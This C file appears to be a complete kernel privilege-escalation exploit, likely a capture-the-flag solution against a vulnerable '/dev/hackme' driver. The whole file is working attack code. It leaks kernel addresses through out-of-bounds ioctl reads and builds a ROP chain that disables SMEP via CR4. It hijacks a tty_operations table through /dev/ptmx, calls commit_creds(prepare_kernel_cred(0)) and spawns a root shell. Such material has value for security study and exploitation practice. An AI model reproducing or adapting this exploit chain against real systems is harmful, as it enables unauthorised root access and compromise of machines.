#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <sys/mman.h>
#define prepare_kernel_cred_addr_offset 0x4d3d0
#define commit_creds_addr 0x4d220

long long readbuf[0x1000];
void* fake_tty_operations[30];
size_t kcode = 0;;
int fd = -1;
int fdx = -1;
long long header[4];

size_t user_cs, user_ss, user_rflags, user_sp;

void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*]status has been saved.");
}


void get_shell()
{
    system("/bin/sh");
}

void get_root()
{
    char* (*pkc)(int) = prepare_kernel_cred_addr_offset + kcode;
    void (*cc)(char*) = commit_creds_addr + kcode;
    (*cc)((*pkc)(0));
}

size_t get_heap_addr(){
	char buf[0x400];
	memset(buf,'A',0x100);
	header[1] = (long long)buf;
	header[2] = 0x100;
	header[3] = 0;
	for(int i=20;i<24;i++){
		header[0] = i;
		if( ioctl(fd,0x30000,header) ) 
			exit(-i);
	}
	for(int i=20;i<23;i++){
		header[0] = i;
		if( ioctl(fd,0x30001,header) ) 
			exit(-i);
	}

	header[0] = 23;
	header[1] = (long long)readbuf;
	header[3] = -0x100*1;
	header[2] = -header[3];
	if( ioctl(fd,0x30003,header) ) 
		exit(0);

	long long kaddr = readbuf[0];
	printf("%p\n",(void*)kaddr);


	header[2] = 0x100;
	header[3] = 0;
	for(int i=20;i<23;i++){
		header[0] = i;
		if( ioctl(fd,0x30000,header) ) 
			exit(-i);
	}
	return kaddr;
}
void get_kernel_addr(){
	char buf[0x400];
	memset(buf,'A',0x400);
	header[1] = (long long)buf;
	header[2] = 0x400;
	header[3] = 0;
	for(int i=0;i<10;i++){
		header[0] = i;
		if( ioctl(fd,0x30000,header) ) exit(-i);
	}

	for(int i=0;i<9;i++){
                header[0] = i;
                if( ioctl(fd,0x30001,header) ) exit(-i);
        }

	fdx = open("/dev/ptmx",O_RDWR|O_NOCTTY);

	header[3] = -(0x400*1);
	header[2] = -header[3];
	header[0] = 9;
	long long x[0x3*2*1] = {};
	header[1] = (long long)x;
	if( ioctl(fd,0x30003,header) ) exit(-6);
	kcode = x[3]-0x625d80;
}

int main(){
	fd = open("/dev/hackme",O_RDONLY);
	save_status();
	size_t kaddr = get_heap_addr();
	get_kernel_addr();
	size_t xchg_esp_eax = kcode+0x1c7998;
	unsigned long lower_addr = xchg_esp_eax & 0xFFFFFFFF;
    	unsigned long base = lower_addr & ~0xFFF;
    	if (mmap(base, 0x10000, 7, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0) != base)
    	{	
        	perror("mmap");
	        exit(1);
    	}
	printf(" lower_addr %p\n",(void*)lower_addr);
	memset(lower_addr,'A',0x100);
	int i = 0;
    size_t rop[32] = {0};
    //rop[i++] = 0xdeedbeef;
    rop[i++] = kcode+0x1b5a1;      // pop rax; ret;
    rop[i++] = 0x6f0;
    rop[i++] = kcode+0x252b;      // mov cr4, rax ; push rcx ; popfq ; pop rbp ; ret;
    rop[i++] = 0;
    rop[i++] = (size_t)get_root;
    rop[i++] = kcode + 0x200c2e;  //swapgs ; popfq ; pop rbp ; ret
    rop[i++] = 0;
    rop[i++] = 0;
    rop[i++] = kcode+0x19356;      // iretq; ret;
    rop[i++] = (size_t)get_shell;
    rop[i++] = user_cs;                /* saved CS */
    rop[i++] = user_rflags;            /* saved EFLAGS */
    rop[i++] = user_sp;
    rop[i++] = user_ss;

	header[0] = 21;
	header[1] = (long long)rop;
	header[2] = 0xa0;
	header[3] = 0x30;
	if( ioctl(fd,0x30002,header) )  exit(0);	
	
	///// Write ROP on the kernel space
	
	for(int i = 0; i < 30; i++)
    	{
        	fake_tty_operations[i] = kcode+0x1a8966;
    	}
	//fake_tty_operations[4] =xchg_esp_eax;
	fake_tty_operations[7]  = xchg_esp_eax;

	
	header[0] = 22;
	header[1] = (long long)fake_tty_operations;
	header[2] = sizeof(fake_tty_operations);
	header[3] = 0;
	if( ioctl(fd,0x30002,header) )  exit(0);
	
	///// Write fake_tty_operations on the kernel space

	printf("kaddr = %p\n",(void*)kaddr);	
 	printf("xchg_esp_eax = %p\n",(void*)xchg_esp_eax);
	printf("magic = %p\n",(void*)rop[0]);
        header[3] = -(0x400*1);
        header[2] = -header[3];
        header[0] = 9;
        long long x[0x3*2*1] = {};
        header[1] = (long long)&x;
        if( ioctl(fd,0x30003,header) ) exit(-6);
        x[3] =  kaddr-0x100;
	if( ioctl(fd,0x30002,header) ) exit(-7);
	
	char cc;
	//read(0,&cc,1);
	write(fdx,&cc,1);
}	
